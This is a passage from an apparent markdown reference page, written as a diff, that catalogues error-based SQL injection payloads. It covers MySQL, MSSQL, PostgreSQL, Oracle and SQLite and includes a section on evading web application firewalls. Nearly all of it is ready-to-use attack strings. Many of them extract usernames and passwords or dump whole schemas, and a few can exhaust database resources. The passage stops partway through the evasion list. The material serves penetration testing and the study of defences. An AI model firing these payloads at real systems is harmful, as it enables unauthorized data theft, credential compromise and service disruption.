+- **Match and Replace:** Set up rules to detect error message patterns: \`XPATH syntax error\`, \`Conversion failed\`, \`invalid input syntax\`, \`ORA-\`, \`LPX-\`
+
+### Ghauri
+
+Alternative to sqlmap, specifically designed for blind and error-based injection. Used in CVE-2024-8529 (LearnPress) exploitation.
+
+\`\`\`bash
+ghauri -u "http://target/page?id=1" --technique=E --dbs
+\`\`\`
+
+---
+
+## Payload Crafting
+
+### MySQL Error Functions (15 Functions)
+
+#### M-01: EXTRACTVALUE (XPath Error)
+
+\`\`\`sql
+-- DB: MySQL >= 5.1 | Char limit: 32 | Error: XPATH syntax error: '~<data>~'
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e))
+-- Alternative first args: RAND(), null, 0x0a
+EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))
+\`\`\`
+
+#### M-02: UPDATEXML (XPath Error)
+
+\`\`\`sql
+-- DB: MySQL >= 5.0 | Char limit: 32 | Error: XPATH syntax error: '~<data>~'
+AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)
+AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)
+AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1)
+AND UPDATEXML(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e),1)
+AND UPDATEXML(NULL,CONCAT(0x0a,version()),NULL)
+AND UPDATEXML(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)),NULL)
+\`\`\`
+
+#### M-03: FLOOR + RAND + GROUP BY (Duplicate Entry)
+
+\`\`\`sql
+-- DB: MySQL >= 4.1 | Char limit: ~64 | Error: Duplicate entry '<data>1' for key 'group_key'
+AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
+AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
+AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
+-- HAVING variant:
+OR 1 GROUP BY CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2)) HAVING MIN(0)-- -
+-- Requires source table with >= 3 rows. information_schema.tables is reliable.
+\`\`\`
+
+#### M-04: EXP() Overflow
+
+\`\`\`sql
+-- DB: MySQL >= 5.5.5 | Char limit: ~255 | Error: DOUBLE value is out of range in 'exp(~(...))'
+AND EXP(~(SELECT*FROM(SELECT version())x))
+AND EXP(~(SELECT*FROM(SELECT CONCAT(0x7e,version(),0x7e))x))
+AND EXP(~(SELECT*FROM(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)x))
+AND EXP(~(SELECT*FROM(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1)x))
+\`\`\`
+
+#### M-05: BIGINT Overflow (~0 Subtraction)
+
+\`\`\`sql
+-- DB: MySQL >= 5.5.5 | Char limit: ~255 | Error: BIGINT value is out of range
+AND !(SELECT*FROM(SELECT version())x)-~0
+AND !(SELECT*FROM(SELECT CONCAT(0x7e,@@version,0x7e))x)-~0
+AND !(SELECT*FROM(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)x)-~0
+AND !(SELECT*FROM(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1)x)-~0
+-- Math function variants (all trigger BIGINT overflow):
+AND !ATAN((SELECT*FROM(SELECT user())a))-~0
+AND !CEIL((SELECT*FROM(SELECT user())a))-~0
+AND !FLOOR((SELECT*FROM(SELECT user())a))-~0
+AND !ROUND((SELECT*FROM(SELECT user())a))-~0
+AND !SQRT((SELECT*FROM(SELECT user())a))-~0
+AND !TAN((SELECT*FROM(SELECT user())a))-~0
+AND !TRUNCATE((SELECT*FROM(SELECT user())a),0)-~0
+AND !SIGN((SELECT*FROM(SELECT user())a))-~0
+AND !HEX((SELECT*FROM(SELECT user())a))-~0
+-- XOR variant:
+AND !(SELECT*FROM(SELECT user())a)-0^222
+-- INSERT context:
+INSERT INTO t VALUES (2,''OR!(SELECT*FROM(SELECT user())x)-~0 OR'','x')
+-- UPDATE context:
+UPDATE t SET col='val'OR!(SELECT*FROM(SELECT user())x)-~0 OR'' WHERE id=1
+-- DELETE context:
+DELETE FROM t WHERE id='1'OR!(SELECT*FROM(SELECT user())x)-~0 OR''
+-- DIOS (Dump In One Shot, ~27 rows):
+AND !(SELECT*FROM(SELECT(CONCAT(@:=0,(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND @:=CONCAT(@,0x0a,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
+\`\`\`
+
+#### M-06: NAME_CONST (Duplicate Column)
+
+\`\`\`sql
+-- DB: MySQL 5.0.12 to ~5.5 | Char limit: varies | Error: Duplicate column name '<data>'
+-- LIMITATION: Only works with constant expressions (version(), etc.), NOT arbitrary subqueries
+AND (SELECT*FROM(SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)
+\`\`\`
+
+#### M-07: GTID_SUBSET
+
+\`\`\`sql
+-- DB: MySQL >= 5.6 | Char limit: ~200+ | Error: Malformed GTID set specification '<data>'
+AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1337)
+AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1337)
+AND GTID_SUBSET(CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1337)
+AND GTID_SUBSET(CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e),1337)
+-- GROUP_CONCAT variant:
+') OR GTID_SUBSET(CONCAT(0x7e,(SELECT GROUP_CONCAT(user,':',password) FROM manage),0x7e),1)--+
+\`\`\`
+
+#### M-08: GTID_SUBTRACT
+
+\`\`\`sql
+-- DB: MySQL >= 5.6 | Char limit: ~200+ | Error: Malformed GTID set specification '<data>'
+AND GTID_SUBTRACT(CONCAT(0x7e,(SELECT @@version),0x7e),1337)
+AND GTID_SUBTRACT(CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1)
+\`\`\`
+
+#### M-09: JSON_KEYS
+
+\`\`\`sql
+-- DB: MySQL >= 5.7.8 | Char limit: ~200+ | Error: Invalid JSON text in argument 1: '<data>'
+AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))
+AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e)) USING utf8)))
+\`\`\`
+
+#### M-10: UUID_TO_BIN
+
+\`\`\`sql
+-- DB: MySQL >= 8.0 | Char limit: ~100+ | Error: Incorrect string value: '<data>' for function uuid_to_bin
+AND UUID_TO_BIN((SELECT @@version))
+AND UUID_TO_BIN((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))
+\`\`\`
+
+#### M-11: BIN_TO_UUID
+
+\`\`\`sql
+-- DB: MySQL >= 8.0 | Char limit: ~100+ | Error: Incorrect string value: '<data>' for function bin_to_uuid
+OR BIN_TO_UUID((SELECT @@version))='1'
+OR BIN_TO_UUID((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))='1'
+OR BIN_TO_UUID((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1))='1'
+\`\`\`
+
+#### M-12: ST_LatFromGeoHash / ST_LongFromGeoHash / ST_PointFromGeoHash
+
+\`\`\`sql
+-- DB: MySQL >= 5.7.5 | Char limit: ~100+ | Error: Incorrect geohash value: '<data>'
+AND ST_LatFromGeoHash((SELECT @@version))
+AND ST_LongFromGeoHash((SELECT @@version))
+AND ST_PointFromGeoHash((SELECT @@version),4326)
+AND ST_LatFromGeoHash((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))
+\`\`\`
+
+#### M-13: ST_GeomFromGeoJSON
+
+\`\`\`sql
+-- DB: MySQL >= 5.7.5 | Char limit: ~200+ | Error: Invalid GeoJSON data
+AND ST_GeomFromGeoJSON((SELECT version()))
+AND ST_GeomFromGeoJSON((SELECT CONCAT(username,':',password) FROM users LIMIT 0,1))
+\`\`\`
+
+#### M-14: Geometry Functions (GEOMETRYCOLLECTION, POLYGON, MULTIPOINT, etc.)
+
+\`\`\`sql
+-- DB: MySQL 5.1-5.5 only | Error: Illegal non geometric value
+AND GEOMETRYCOLLECTION((SELECT*FROM(SELECT*FROM(SELECT @@version)a)b))
+AND MULTIPOINT((SELECT*FROM(SELECT*FROM(SELECT user())a)b))
+AND POLYGON((SELECT*FROM(SELECT*FROM(SELECT database())a)b))
+AND LINESTRING((SELECT*FROM(SELECT*FROM(SELECT @@version)a)b))
+AND MULTILINESTRING((SELECT*FROM(SELECT*FROM(SELECT @@version)a)b))
+AND MULTIPOLYGON((SELECT*FROM(SELECT*FROM(SELECT @@version)a)b))
+-- Requires double-nested subquery. Removed/changed in MySQL 5.6+.
+\`\`\`
+
+#### M-15: PROCEDURE ANALYSE + Error Functions
+
+\`\`\`sql
+-- DB: MySQL 5.1 to 5.5 only (deprecated 5.7.18, removed 8.0) | Char limit: 32
+-- Useful when injection point is after LIMIT clause
+SELECT * FROM users WHERE id=1 LIMIT 1,1 PROCEDURE ANALYSE(EXTRACTVALUE(0,CONCAT(0x3a,version())),1)
+-- Output: XPATH syntax error: ':5.5.68'
+\`\`\`
+
+### MSSQL Error Functions (8 Functions)
+
+#### S-01: CONVERT
+
+\`\`\`sql
+-- DB: MSSQL (all versions) | Char limit: ~8000 | Error: Conversion failed when converting the nvarchar value '<data>' to data type int.
+AND 1=CONVERT(int,@@version)
+AND 1=CONVERT(int,user_name())
+AND 1=CONVERT(int,db_name())
+AND 1=CONVERT(int,@@SERVERNAME)
+AND 1=CONVERT(int,@@SERVICENAME)
+AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))
+AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))
+AND 1=CONVERT(int,(SELECT TOP 1 username+':'+password FROM users))
+-- String context: '+CONVERT(int,@@version)+'
+\`\`\`
+
+#### S-02: CAST
+
+\`\`\`sql
+-- DB: MSSQL (all versions) | Char limit: ~8000 | Error: Conversion failed
+AND 1=CAST(@@version AS int)
+AND 1=CAST(user_name() AS int)
+AND 1=CAST(db_name() AS int)
+AND 1=CAST((SELECT TOP 1 table_name FROM information_schema.tables) AS int)
+AND 1=CAST((SELECT TOP 1 username+':'+password FROM users) AS int)
+-- Bulk via FOR XML PATH:
+AND 1=CAST((SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')) AS int)
+\`\`\`
+
+#### S-03: Implicit Conversion
+
+\`\`\`sql
+-- DB: MSSQL (all versions) | Char limit: ~8000 | No CAST/CONVERT keyword needed
+AND @@version=1
+AND 1=db_name()
+AND 1/@@version
+AND 0+@@version
+-- IN clause:
+AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~'))
+-- CONCAT:
+AND 1337=CONCAT('~',(SELECT @@version),'~')
+\`\`\`
+
+#### S-04: FOR XML PATH (Multi-Row Extraction)
+
+\`\`\`sql
+-- DB: MSSQL 2005+ | Char limit: entire result set | Dumps ALL rows
+AND 1=CAST((SELECT username+':'+password+'|' FROM users FOR XML PATH('')) AS int)
+AND 1=CAST((SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')) AS int)
+AND 1=CAST((SELECT column_name+',' FROM information_schema.columns WHERE table_name='users' FOR XML PATH('')) AS int)
+\`\`\`
+
+#### S-05: FOR JSON PATH (Multi-Row, MSSQL 2016+)
+
+\`\`\`sql
+-- DB: MSSQL 2016+ | Char limit: entire result set | WAF bypass (JSON format)
+AND 1=CONVERT(int,(SELECT username,password FROM users FOR JSON PATH))
+AND 1=CONVERT(int,(SELECT * FROM users FOR JSON PATH))
+\`\`\`
+
+#### S-06: System Function Concatenation (WAF Bypass)
+
+\`\`\`sql
+-- DB: MSSQL (all versions) | Functions not in typical WAF signatures
+AND 1=SUSER_NAME(@@version)
+AND 1=USER_NAME(@@version)
+AND 1=DB_NAME(@@version)
+AND 1=FILE_NAME(@@version)
+AND 1=TYPE_NAME(@@version)
+AND 1=COL_NAME(@@version,1)
+AND 1=OBJECT_NAME(@@version)
+-- URL-encoded + as WAF bypass: ?id=1'%2buser_name(@@version)--
+\`\`\`
+
+#### S-07: HAVING + GROUP BY Column Enumeration
+
+\`\`\`sql
+-- DB: MSSQL (all versions) | Error: Column 'table.column' is invalid
+' HAVING 1=1--
+' GROUP BY table.column1 HAVING 1=1--
+' GROUP BY table.column1, table.column2 HAVING 1=1--
+-- Each error reveals the next ungrouped column name
+\`\`\`
+
+#### S-08: DIOS (Dump In One Shot)
+
+\`\`\`sql
+-- DB: MSSQL (requires stacked queries) | Char limit: variable
+;DECLARE @out VARCHAR(8000)='';
+SELECT @out=@out+table_name+'::'+column_name+',' FROM information_schema.columns;
+SELECT CONVERT(int,@out)--
+\`\`\`
+
+### PostgreSQL Error Functions (6 Functions)
+
+> **Note:** CVE-2025-1094 (PostgreSQL libpq string escape bypass) is documented on the [Classic / In-Band SQLi](01-Classic-In-Band.md) page -- it exploits string boundary escape, not error-based extraction.
+
+#### P-01: CAST to INT / NUMERIC
+
+\`\`\`sql
+-- DB: PostgreSQL (all versions) | Char limit: ~256 | Error: invalid input syntax for type integer: "<data>"
+AND 1=CAST((SELECT version()) AS int)
+AND 1=CAST((SELECT current_database()) AS int)
+AND 1=CAST((SELECT current_user) AS int)
+AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)
+AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS int)
+AND 1=CAST((SELECT username||':'||password FROM users LIMIT 1) AS int)
+-- With chr() delimiters:
+CAST(chr(126)||version()||chr(126) AS NUMERIC)
+CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0)||chr(126) AS NUMERIC)
+CAST(chr(126)||(SELECT password FROM users LIMIT 1 OFFSET 0)||chr(126) AS NUMERIC)
+-- With CONCAT:
+AND 1=CAST((SELECT CONCAT('DATABASE: ',current_database())) AS int)
+\`\`\`
+
+#### P-02: :: Shorthand Cast
+
+\`\`\`sql
+-- DB: PostgreSQL (all versions) | Char limit: ~256 | Same error as CAST
+AND (SELECT version())::int=1
+AND current_database()::int=1
+AND (SELECT table_name FROM information_schema.tables LIMIT 1)::int=1
+AND (SELECT username||':'||password FROM users LIMIT 1)::int=1
+-- String concat context:
+'||(SELECT username||':'||password FROM users LIMIT 1)::INT||'
+\`\`\`
+
+#### P-03: query_to_xml (Bulk Extraction)
+
+\`\`\`sql
+-- DB: PostgreSQL >= 8.3 | Char limit: entire result set | ALL rows in single query
+AND 1=CAST(query_to_xml('SELECT * FROM users',true,true,'')::text AS int)
+AND 1=CAST(query_to_xml('SELECT * FROM pg_user',true,true,'')::text AS int)
+-- WARNING: Can cause performance issues on large tables
+\`\`\`
+
+#### P-04: database_to_xml / database_to_xmlschema
+
+\`\`\`sql
+-- DB: PostgreSQL >= 8.3 | Char limit: entire database | EXTREME CAUTION: DoS risk
+AND 1=CAST(database_to_xml(true,true,'')::text AS int)
+AND 1=CAST(database_to_xmlschema(true,true,'')::text AS int)
+-- WARNING: Dumps ENTIRE database/schema. Extremely slow on production databases.
+\`\`\`
+
+#### P-05: CASE WHEN + CAST (Conditional + Data Leak)
+
+\`\`\`sql
+-- DB: PostgreSQL (all versions) | Conditional extraction with data in error
+CASE WHEN ((SELECT CAST(CHR(32)||(SELECT version()) AS NUMERIC))='1') THEN name ELSE note END
+\`\`\`
+
+#### P-06: generate_series Resource Error
+
+\`\`\`sql
+-- DB: PostgreSQL >= 8.0 | Conditional oracle (resource exhaustion)
+AND CASE WHEN (condition) THEN 1 ELSE (SELECT COUNT(*) FROM generate_series(1,999999999999)) END=1
+-- Boolean oracle only; useful when CAST-based methods are blocked
+\`\`\`
+
+### Oracle Error Functions (9 Functions)
+
+#### O-01: XMLType Constructor
+
+\`\`\`sql
+-- DB: Oracle 9i+ | Char limit: ~70 (standard), 162 (base64) | Error: LPX-00234: namespace prefix "<data>" is not declared
+AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version WHERE ROWNUM=1),' ','_'),'$','(DOLLAR)'),'#','(HASH)'))||'~'||CHR(62))) FROM DUAL)
+-- Simplified:
+AND XMLType((CHR(60)||'x:'||(SELECT user FROM dual)||CHR(62)))=1
+-- Base64-optimized (162 bytes per request):
+SELECT ''||XMLType('<'||REGEXP_REPLACE(UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW((SELECT banner FROM v$version WHERE ROWNUM=1))))||':x>',CHR(10)||'|'||CHR(13)||'|=',''))||'' FROM DUAL
+-- Must replace spaces, $, @, # (invalid in XML namespace prefixes)
+\`\`\`
+
+#### O-02: CTXSYS.DRITHSX.SN (Oracle Text)
+
+\`\`\`sql
+-- DB: Oracle 10g+ (requires Oracle Text) | Char limit: ~4000 | Error: DRG-11701: thesaurus <data> does not exist
+SELECT CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL
+AND 1=CTXSYS.DRITHSX.SN(user,(SELECT user FROM dual))
+AND 1=CTXSYS.DRITHSX.SN(user,(SELECT global_name FROM global_name))
+AND 1=CTXSYS.DRITHSX.SN(user,(SELECT username||':'||password FROM users WHERE ROWNUM=1))
+-- Aggregated extraction:
+AND 1=CTXSYS.DRITHSX.SN(1,(SELECT SYS.STRAGG(DISTINCT password||';') FROM app.users))
+\`\`\`
+
+#### O-03: UTL_INADDR.GET_HOST_NAME / GET_HOST_ADDRESS
+
+\`\`\`sql
+-- DB: Oracle 8.1.6+ (ACL-restricted in 11g+) | Char limit: ~255 | Error: ORA-29257: host <data> unknown
+SELECT UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL
+SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) FROM DUAL
+AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'~')
+-- NOTE: Blocked by default ACLs in Oracle 11g+. Use CTXSYS.DRITHSX.SN as fallback.
+\`\`\`
+
+#### O-04: DBMS_UTILITY.SQLID_TO_SQLHASH
+
+\`\`\`sql
+-- DB: Oracle 11g+ | Char limit: ~4000 | Error: Invalid SQLID
+AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'~')
+AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT user FROM DUAL)||'~')
+\`\`\`
+
+#### O-05: ORDSYS.ORD_DICOM.GETMAPPINGXPATH
+
+\`\`\`sql
+-- DB: Oracle 10g R2+ (requires DICOM/Multimedia) | Char limit: ~4000
+SELECT ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),user,user) FROM DUAL
+\`\`\`
+
+#### O-06: DBMS_XMLGEN.GETXML
+
+\`\`\`sql
+-- DB: Oracle 9i+ | Char limit: ~4000 | Error: ORA-00904 invalid identifier
+SELECT TO_CHAR(DBMS_XMLGEN.GETXML('SELECT "'||(SELECT user FROM sys.dual)||'" FROM sys.dual')) FROM DUAL
+AND 1=TO_NUMBER(DBMS_XMLGEN.GETXML('SELECT "'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'" FROM DUAL'))
+\`\`\`
+
+#### O-07: XDBURITYPE (getblob/getclob)
+
+\`\`\`sql
+-- DB: Oracle 10g+ (requires XDB) | Char limit: ~4000 | URI resolution error
+AND 1=(SELECT XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob() FROM DUAL)
+AND 1=(SELECT XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob() FROM DUAL)
+\`\`\`
+
+#### O-08: DBMS_XDB_VERSION (CHECKIN/MAKEVERSIONED/UNCHECKOUT)
+
+\`\`\`sql
+-- DB: Oracle 11g+ (requires XML DB) | Char limit: ~4000
+AND 1=DBMS_XDB_VERSION.CHECKIN((SELECT banner FROM v$version WHERE ROWNUM=1))
+AND 1=DBMS_XDB_VERSION.MAKEVERSIONED((SELECT user FROM DUAL))
+AND 1=DBMS_XDB_VERSION.UNCHECKOUT((SELECT user FROM DUAL))
+\`\`\`
+
+#### O-09: XMLAGG + XMLELEMENT (Multi-Row)
+
+\`\`\`sql
+-- DB: Oracle 10g+ | Char limit: entire result set | Aggregates all rows
+SELECT RTRIM(EXTRACT(XMLAGG(XMLELEMENT("s",username||',')),'/s').GETSTRINGVAL(),',') FROM all_users
+-- Combined with error:
+AND 1=CAST((SELECT RTRIM(EXTRACT(XMLAGG(XMLELEMENT("s",username||',')),'/s').GETSTRINGVAL(),',') FROM all_users) AS NUMBER)
+\`\`\`
+
+### SQLite Error Functions (5 Functions)
+
+All SQLite error techniques are **conditional oracles** (error/no-error boolean). SQLite has no direct data-in-error extraction functions.
+
+#### L-01: CASE WHEN + load_extension()
+
+\`\`\`sql
+-- DB: SQLite (load_extension must be enabled) | Boolean oracle | Error: not authorized
+AND CASE WHEN (SELECT 1 FROM sqlite_master WHERE type='table' AND name='users') THEN 1 ELSE load_extension(1) END
+AND CASE WHEN (SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a' THEN 1 ELSE load_extension(1) END
+AND CASE WHEN (SELECT COUNT(*) FROM users)>5 THEN 1 ELSE load_extension(1) END
+\`\`\`
+
+#### L-02: abs() Integer Overflow
+
+\`\`\`sql
+-- DB: SQLite 3.x | Boolean oracle | Error: integer overflow
+AND CASE WHEN (SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a' THEN ABS(-9223372036854775808) ELSE 0 END
+-- -9223372036854775808 is minimum signed 64-bit integer; its absolute value overflows
+\`\`\`
+
+#### L-03: json() Malformed JSON
+
+\`\`\`sql
+-- DB: SQLite >= 3.9.0 (JSON1 extension) | Boolean oracle | Error: malformed JSON
+AND CASE WHEN (SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='p' THEN json('{"valid":1}') ELSE json('') END AND 'A'='A
+-- json('') triggers malformed JSON error; json('{"valid":1}') succeeds
+\`\`\`
+
+#### L-04: zeroblob() Memory Error
+
+\`\`\`sql
+-- DB: SQLite (all versions) | Boolean oracle | Error: string or blob too big
+AND CASE WHEN (condition) THEN 0 ELSE zeroblob(999999999999) END
+-- WARNING: Can cause DoS. Use sparingly.
+\`\`\`
+
+#### L-05: MATCH on Non-FTS Table
+
+\`\`\`sql
+-- DB: SQLite with FTS3/FTS4/FTS5 | Boolean oracle | Error: MATCH error
+AND CASE WHEN (condition) THEN 1 ELSE (SELECT 1 FROM users WHERE username MATCH 'x') END
+\`\`\`
+
+### Conditional Error Payloads (All Databases)
+
+\`\`\`sql
+-- Oracle: CASE WHEN + TO_CHAR(1/0)
+'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+-- MSSQL: CASE WHEN + 1/0
+AND CASE WHEN (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') THEN 1/0 ELSE NULL END
+
+-- PostgreSQL: CASE WHEN + 1/(SELECT 0)
+AND 1=(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/(SELECT 0) ELSE NULL END FROM users WHERE username='administrator')
+
+-- MySQL: IF + EXP overflow
+AND IF(SUBSTRING(user(),1,1)='r',EXP(710),0)
+
+-- MySQL: CASE WHEN + BIGINT overflow (no function keywords -- WAF bypass)
+AND CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' THEN 9223372036854775807+1 ELSE 0 END
+
+-- SQLite: CASE WHEN + load_extension
+AND CASE WHEN (SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a' THEN 1 ELSE load_extension(1) END
+\`\`\`
+
+### WAF Evasion Payloads (20+ Techniques)
+
+#### 1. Case Randomization
+
+\`\`\`sql
+ExtRaCtVaLuE(1,CONCAT(0x7e,(SELECT version()),0x7e))
+uPdAtExMl(1,CONCAT(0x7e,(SELECT user()),0x7e),1)
+cOnVeRt(int,@@version)
+\`\`\`
+
+#### 2. Inline Comment Injection
+
+\`\`\`sql
+AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/version()),0x7e))
+1'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--
+\`\`\`
+
+#### 3. MySQL Version-Conditional Comments
+
+\`\`\`sql
+/*!50000EXTRACTVALUE*/(1,CONCAT(0x7e,(SELECT version()),0x7e))
+/*!50540AND*//*!50540EXTRACTVALUE*/(1,CONCAT(0x7e,version(),0x7e))
+-- WAF sees /* comment */, MySQL 5.0+ executes it as code
+\`\`\`
+
+#### 4. Alternative Error Function Substitution
+
+| Blocked | Alternative | DB Version |
+|---------|-------------|------------|
+| EXTRACTVALUE | UPDATEXML | MySQL >= 5.0 |
+| UPDATEXML | EXTRACTVALUE | MySQL >= 5.1 |
+| Both XPath funcs | GTID_SUBSET | MySQL >= 5.6 |
+| All above | JSON_KEYS | MySQL >= 5.7 |
+| All above | UUID_TO_BIN / BIN_TO_UUID | MySQL >= 8.0 |
+| All above | ST_LatFromGeoHash | MySQL >= 5.7 |
+| CAST/CONVERT | Implicit arithmetic (1/@@version) | MSSQL all |
+| CAST | ::int shorthand | PostgreSQL |
+| XMLType | CTXSYS.DRITHSX.SN | Oracle |
+| UTL_INADDR | ordsys.ord_dicom.getmappingxpath | Oracle |
+
+#### 5. Nested Function Wrapping
+
+\`\`\`sql
+AND IF(1=1,EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e)),0)
+AND COALESCE(EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e)),0)
+AND IIF(1=1,CONVERT(int,@@version),0)  -- MSSQL
+\`\`\`
+
+#### 6. Hex Encoding of Arguments
+
+\`\`\`sql
+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username=0x61646d696e),0x7e))
+-- 0x61646d696e = 'admin'
+\`\`\`
+
+#### 7. CHAR() Function String Building
+
+\`\`\`sql
+EXTRACTVALUE(1,CONCAT(CHAR(126),(SELECT version()),CHAR(126)))
+CHR(60)||CHR(58)||'~'||(SELECT banner FROM v$version)||'~'||CHR(62)  -- Oracle
+\`\`\`
+
+#### 8. Double URL Encoding
+
+\`\`\`
+%2527%2520AND%2520EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--
+-- WAF decodes once (still encoded), backend decodes twice (valid payload)
+\`\`\`
+
+#### 9. Whitespace Alternatives
+
+\`\`\`sql
+1'%09AND%09EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--  -- Tab
+1'%0aAND%0aEXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--  -- Newline
+1'%0dAND%0dEXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--  -- Carriage return
+1'AND(EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e)))--        -- Parentheses
+\`\`\`
+
+#### 10. Conditional Error Without Function Keywords
+
+\`\`\`sql
+-- No EXTRACTVALUE, UPDATEXML, CAST, CONVERT keywords:
+AND CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' THEN 9223372036854775807+1 ELSE 0 END
+-- Only CASE, WHEN, THEN, ELSE, SUBSTRING -- standard SQL
+\`\`\`
+
+#### 11. Implicit Type Conversion (No CAST/CONVERT)
+
+\`\`\`sql
+AND 1=1/@@version                     -- MSSQL
+AND 0+@@version                       -- MSSQL
+AND 1337 IN (SELECT '~'+(SELECT @@version)+'~')  -- MSSQL
+\`\`\`
+
+#### 12. HAVING Clause Injection
+
+\`\`\`sql
+1' GROUP BY CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2)) HAVING MIN(0)--  -- MySQL
+1' HAVING 1=CONVERT(int,@@version)--  -- MSSQL
+\`\`\`
+
+#### 13. PROCEDURE ANALYSE Injection (MySQL 5.1-5.5)
+
+\`\`\`sql
+LIMIT 1,1 PROCEDURE ANALYSE(EXTRACTVALUE(0,CONCAT(0x3a,version())),1)
+\`\`\`
+
+#### 14. JSON Operator Bypass (Claroty/Team82, 2022)
+
+\`\`\`sql
+' OR JSON_EXTRACT('{"a":1}','$.a')=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -
